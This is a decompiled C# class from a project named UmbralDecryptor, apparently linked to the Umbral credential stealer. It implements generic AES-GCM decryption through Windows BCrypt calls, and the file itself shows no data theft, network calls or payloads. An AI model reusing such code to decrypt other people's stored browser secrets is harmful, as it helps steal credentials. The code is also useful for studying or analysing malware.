using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace UmbralDecryptor
{
    public class Class33
    {
        // Token: 0x060003F9 RID: 1017 RVA: 0x0001D480 File Offset: 0x0001B680
        public byte[] method_0(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        {
            IntPtr intPtr = this.method_2(GClass5.string_5, GClass5.string_6, GClass5.string_1);
            IntPtr intPtr3;
            IntPtr intPtr2 = this.method_3(intPtr, key, out intPtr3);
            GClass5.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new GClass5.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
            byte[] array2;
            using (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
            {
                byte[] array = new byte[this.method_1(intPtr)];
                int num = 0;
                uint num2 = GClass5.BCryptDecrypt(intPtr3, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0);
                if (num2 != 0U)
                {
                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", num2));
                }
                array2 = new byte[num];
                num2 = GClass5.BCryptDecrypt(intPtr3, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
                if (num2 == GClass5.uint_3)
                {
                    throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
                }
                if (num2 != 0U)
                {
                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", num2));
                }
            }
            GClass5.BCryptDestroyKey(intPtr3);
            Marshal.FreeHGlobal(intPtr2);
            GClass5.BCryptCloseAlgorithmProvider(intPtr, 0U);
            return array2;
        }

        // Token: 0x060003FA RID: 1018 RVA: 0x0001D590 File Offset: 0x0001B790
        private int method_1(IntPtr hAlg)
        {
            byte[] array = this.method_4(hAlg, GClass5.string_2);
            return BitConverter.ToInt32(new byte[]
            {
            array[4],
            array[5],
            array[6],
            array[7]
            }, 0);
        }

        // Token: 0x060003FB RID: 1019 RVA: 0x0001D5D0 File Offset: 0x0001B7D0
        private IntPtr method_2(string alg, string provider, string chainingMode)
        {
            IntPtr zero = IntPtr.Zero;
            uint num = GClass5.BCryptOpenAlgorithmProvider(out zero, alg, provider, 0U);
            if (num != 0U)
            {
                throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", num));
            }
            byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
            num = GClass5.BCryptSetProperty(zero, GClass5.string_3, bytes, bytes.Length, 0);
            if (num != 0U)
            {
                throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", num));
            }
            return zero;
        }

        // Token: 0x060003FC RID: 1020 RVA: 0x0001D640 File Offset: 0x0001B840
        private IntPtr method_3(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            int num = BitConverter.ToInt32(this.method_4(hAlg, GClass5.string_0), 0);
            IntPtr intPtr = Marshal.AllocHGlobal(num);
            byte[] array = this.method_5(new byte[][]
            {
            GClass5.byte_0,
            BitConverter.GetBytes(1),
            BitConverter.GetBytes(key.Length),
            key
            });
            uint num2 = GClass5.BCryptImportKey(hAlg, IntPtr.Zero, GClass5.string_4, out hKey, intPtr, num, array, array.Length, 0U);
            if (num2 != 0U)
            {
                throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", num2));
            }
            return intPtr;
        }

        // Token: 0x060003FD RID: 1021 RVA: 0x0001D6C8 File Offset: 0x0001B8C8
        private byte[] method_4(IntPtr hAlg, string name)
        {
            int num = 0;
            uint num2 = GClass5.BCryptGetProperty(hAlg, name, null, 0, ref num, 0U);
            if (num2 != 0U)
            {
                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", num2));
            }
            byte[] array = new byte[num];
            num2 = GClass5.BCryptGetProperty(hAlg, name, array, array.Length, ref num, 0U);
            if (num2 != 0U)
            {
                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", num2));
            }
            return array;
        }

        // Token: 0x060003FE RID: 1022 RVA: 0x0001D730 File Offset: 0x0001B930
        public byte[] method_5(params byte[][] arrays)
        {
            int num = 0;
            foreach (byte[] array in arrays)
            {
                if (array != null)
                {
                    num += array.Length;
                }
            }
            byte[] array2 = new byte[num - 1 + 1];
            int num2 = 0;
            foreach (byte[] array3 in arrays)
            {
                if (array3 != null)
                {
                    Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
                    num2 += array3.Length;
                }
            }
            return array2;
        }
    }
}
